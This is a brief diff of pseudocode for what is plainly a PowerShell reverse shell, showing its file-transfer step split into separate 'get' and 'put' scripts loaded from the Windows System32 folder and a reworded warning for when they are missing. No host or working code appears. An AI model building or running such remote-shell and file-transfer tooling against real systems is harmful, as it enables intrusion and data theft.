@@ -17,9 +17,12 @@ TRY
     WRITE "Connected to PowerShell reverse shell" to writer
 
     TRY
-        EXECUTE script "C:\Windows\System32\Transfer.ps1"
+        EXECUTE script "C:\Windows\System32\get.ps1"
+        EXECUTE script "C:\Windows\System32\put.ps1"
     CATCH
-        WRITE "\nWARNING !!!! \nTRANSFER MODULE MISSING" to writer
+        WRITE "" to writer
+        WRITE "WARNING !!!!" to writer
+        WRITE "GET or PUT module MISSING" to writer
     ENDTRY
 
     WHILE true
